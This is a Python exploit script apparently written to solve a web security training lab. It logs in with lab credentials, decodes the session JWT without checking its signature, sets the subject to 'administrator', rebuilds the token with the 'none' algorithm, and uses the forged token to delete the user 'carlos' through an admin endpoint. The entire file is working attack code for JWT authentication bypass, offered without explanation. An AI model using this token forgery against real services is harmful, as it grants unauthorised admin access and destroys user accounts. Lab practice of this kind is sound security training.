import requests as rq
import subprocess
from bs4 import BeautifulSoup
import jwt
import base64
import json


def delete_carlos(modified_token):
    cookies = {"session": modified_token}
    delete_url = f"{BASE}/admin/delete?username=carlos"

    r = rq.get(delete_url, cookies=cookies)

    if r.status_code == 200:
        print("[+] Done!")
    else:
        print(f"[-] Failed: {r.status_code}")


BASE = "https://0a2e00ca04671880809fc629008b0084.web-security-academy.net"
LOGIN = f"{BASE}/login"

s = rq.Session()

r = s.get(LOGIN)
soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

resp = s.post(LOGIN, data={
    "csrf": csrf,
    "username": "wiener",
    "password": "peter"
})

# print("[+] Status:", resp.status_code)
# print("[+] Cookies:", s.cookies.get_dict())

jwt_token = s.cookies.get("session")
# print("[+] JWT:", jwt_token)

decode_token = jwt.decode(jwt_token, options={"verify_signature": False})
print(f"[+] Decode token: {decode_token}\n")

decode_token['sub'] = 'administrator'
print(decode_token)


b64 = lambda x: base64.urlsafe_b64encode(json.dumps(x, separators=(",", ":")).encode()).decode().rstrip("=")
modified_token = f"{b64({'alg':'none','typ':'JWT'})}.{b64(decode_token)}."
print(f"[+] Modified token: {modified_token}")


delete_carlos(modified_token)